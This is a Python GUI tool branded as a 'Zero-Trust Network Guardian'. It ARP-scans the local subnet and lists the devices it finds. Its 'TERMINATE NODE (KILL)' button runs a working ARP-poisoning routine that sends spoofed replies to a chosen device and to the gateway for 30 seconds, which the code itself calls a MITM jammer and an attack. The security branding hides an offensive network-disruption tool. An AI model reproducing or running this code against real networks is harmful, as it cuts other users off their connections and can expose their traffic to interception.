import tkinter as tk
from tkinter import ttk, messagebox
import scapy.all as scapy
import threading
import socket
import time

class SentinelFinal:
    def __init__(self, root):
        self.root = root
        self.root.title("Sentinel AI - Zero-Trust Network Guardian")
        self.root.geometry("1000x650")
        self.root.configure(bg="#0a0a0a")

        # Header Section
        tk.Label(root, text="SENTINEL AI - ZERO TRUST MONITOR", font=("Courier", 24, "bold"), bg="#0a0a0a", fg="#00ff00").pack(pady=20)

        # Automatic IP Range Detection Logic
        input_frame = tk.Frame(root, bg="#0a0a0a")
        input_frame.pack(pady=5)
        
        tk.Label(input_frame, text="Current Network Range:", font=("Arial", 12), bg="#0a0a0a", fg="white").pack(side=tk.LEFT)
        
        self.ip_entry = tk.Entry(input_frame, font=("Arial", 12), width=25, bg="#1a1a1a", fg="#00ff00", insertbackground="white")
        # Auto-Detect IP on startup
        auto_ip = self.get_auto_ip_range()
        self.ip_entry.insert(0, auto_ip)
        self.ip_entry.pack(side=tk.LEFT, padx=10)

        # Professional Table Setup
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#1a1a1a", foreground="white", fieldbackground="#1a1a1a", rowheight=35, font=("Arial", 10))
        style.configure("Treeview.Heading", background="#333333", foreground="white", font=("Arial", 11, "bold"))
        style.map("Treeview", background=[('selected', '#00ff00')], foreground=[('selected', 'black')])

        self.tree = ttk.Treeview(root, columns=("IP", "MAC", "Hostname", "Security Status"), show="headings")
        self.tree.heading("IP", text="NETWORK IP")
        self.tree.heading("MAC", text="MAC ADDRESS")
        self.tree.heading("Hostname", text="DEVICE IDENTIFIER")
        self.tree.heading("Security Status", text="ZERO-TRUST STATUS")
        
        for col in ("IP", "MAC", "Hostname", "Security Status"):
            self.tree.column(col, width=240, anchor="center")
        self.tree.pack(pady=20, padx=20, fill="both", expand=True)

        # Action Buttons
        ctrl_frame = tk.Frame(root, bg="#0a0a0a")
        ctrl_frame.pack(pady=10)

        tk.Button(ctrl_frame, text="START AUTO-SCAN", font=("Arial", 11, "bold"), bg="#00ff00", width=25, height=2, command=self.start_scan).pack(side=tk.LEFT, padx=15)
        tk.Button(ctrl_frame, text="TERMINATE NODE (KILL)", font=("Arial", 11, "bold"), bg="#ff0000", fg="white", width=25, height=2, command=self.start_kill).pack(side=tk.LEFT, padx=15)

        self.status = tk.Label(root, text="System: Operational | Ready for Deployment", bg="#0a0a0a", fg="#00ff00", font=("Arial", 10))
        self.status.pack(side=tk.BOTTOM, fill="x", pady=10)

        self.killing = False

    def get_auto_ip_range(self):
        """Automatically detects the current network subnet"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            base_ip = local_ip.rsplit('.', 1)[0]
            return f"{base_ip}.0/24"
        except:
            return "192.168.100.0/24" # Default fallback

    def get_hostname(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return "Mobile/Wireless Device"

    def scan_logic(self):
        self.status.config(text="ANALYZING SUBNET: Broadcasting Discovery Packets...", fg="yellow")
        target_ip = self.ip_entry.get()
        
        try:
            arp_req = scapy.ARP(pdst=target_ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast/arp_req
            answered = scapy.srp(packet, timeout=3, retry=2, verbose=False)[0]

            for item in self.tree.get_children(): self.tree.delete(item)

            for snd, rcv in answered:
                ip = rcv.psrc
                mac = rcv.hwsrc
                name = self.get_hostname(ip)
                
                # Zero-Trust Labeling Logic
                if ip.endswith(".1"):
                    sec_status = "GATEWAY (TRUSTED)"
                elif "Hamad" in name or "PC" in name.upper():
                    sec_status = "ADMIN (AUTHORIZED)"
                else:
                    sec_status = "UNVERIFIED NODE"
                    
                self.tree.insert("", tk.END, values=(ip, mac, name, sec_status))
            
            self.status.config(text=f"Scan Complete: {len(answered)} Nodes Identified on {target_ip}", fg="#00ff00")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to scan: {e}")

    def kill_logic(self, target_ip, target_mac):
        gateway_ip = target_ip.rsplit('.', 1)[0] + '.1'
        self.killing = True
        self.status.config(text=f"MITM ACTIVE: Jamming Connection for {target_ip}...", fg="red")
        try:
            for _ in range(60): # 30 seconds of disruption
                if not self.killing: break
                # ARP Poisoning Packets
                p1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                p2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
                scapy.send(p1, verbose=False)
                scapy.send(p2, verbose=False)
                time.sleep(0.5)
        except: pass
        self.status.config(text="System Operational", fg="#00ff00")
        self.killing = False

    def start_scan(self): threading.Thread(target=self.scan_logic, daemon=True).start()
    
    def start_kill(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("System Alert", "Please select a target node first!")
            return
        ip, mac, _, status = self.tree.item(selected)['values']
        if "GATEWAY" in status:
            messagebox.showerror("Restricted", "Cannot terminate the primary Gateway!")
            return
        
        if messagebox.askyesno("Confirm Attack", f"Trigger ARP Jammer on {ip}?"):
            threading.Thread(target=self.kill_logic, args=(ip, mac), daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = SentinelFinal(root)
    root.mainloop()
